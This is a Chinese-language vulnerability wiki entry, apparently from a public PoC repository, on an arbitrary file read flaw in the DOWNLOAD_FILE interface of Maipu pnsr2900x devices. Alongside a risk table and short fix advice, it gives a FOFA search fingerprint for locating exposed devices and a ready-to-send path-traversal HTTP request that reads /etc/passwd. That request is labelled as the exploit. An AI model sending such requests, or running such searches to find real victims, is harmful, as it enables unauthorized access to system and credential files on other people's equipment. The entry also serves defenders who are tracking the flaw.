---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 迈普pnsr2900x DOWNLOAD_FILE 任意文件读取漏洞 

# 漏洞描述

迈普pnsr2900x系统接口DOWNLOAD_FILE任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

# 影响版本

迈普pnsr2900x系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/assets/css/ui-dialog.css"&& body="/form/formUserLogin"

POC/EXP：

GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Connection: keep-alive

![image-20241015173223797](./.resource/迈普pnsr2900xDOWNLOAD_FILE任意文件读取漏洞/media/image-20241015173223797.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
